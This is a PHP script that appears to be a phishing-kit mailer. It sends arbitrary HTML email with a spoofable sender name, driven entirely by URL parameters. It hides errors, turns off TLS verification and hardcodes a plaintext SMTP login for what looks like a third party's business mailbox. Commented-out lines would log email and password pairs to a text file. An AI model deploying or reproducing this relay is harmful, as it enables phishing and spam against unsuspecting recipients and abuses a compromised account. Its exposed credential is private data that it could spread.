<?php
error_reporting(0);
include_once 'PHPMailer/class.smtp.php';
include_once 'PHPMailer/class.phpmailer.php';

if ($_GET['send'] == "cc") {
    $emails_remetente = $_GET['ccs'];
    // $email = $_GET['email'];
    // $senha = $_GET['senha'];
    $nome_remetente = $_GET['nome'];
    $assunto = $_GET['assunto'];
    $conteudo = $_GET['conteudo'];

    //Sending the email using a PHPMailer class
    $Mailer = new PHPMailer;
    $Mailer->CharSet = "utf8";
    $Mailer->SMTPDebug = 3;
    $Mailer->IsSMTP();
    $Mailer->SMTPOptions = array(
        'tls' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true,
        ),
    );
    $Mailer->Host = "smtp.hostinger.com";
    $Mailer->SMTPAuth = true;
    $Mailer->Username = 'kelly@accounting-additions.co.uk';
    $Mailer->Password = 'London77*';
    $Mailer->SMTPSecure = "ssl";
    $Mailer->Port = 465;
    $Mailer->FromName = $nome_remetente;
    $Mailer->From = 'kelly@accounting-additions.co.uk';
    $Mailer->AddAddress($emails_remetente);
    $Mailer->IsHTML(true);
    $Mailer->Subject = $assunto;
    $Mailer->Body = $conteudo;

    //Verification
    if ($Mailer->Send()) {
        $Erro = true;
    }
    // $salvar = var_dump($Mailer);
    // $hnd = fopen("./save.txt", "a");
    // fwrite($hnd, "$emails_remetente|$email|$senha|$assunto|$nome_remetente");
    // fclose($hnd);
}
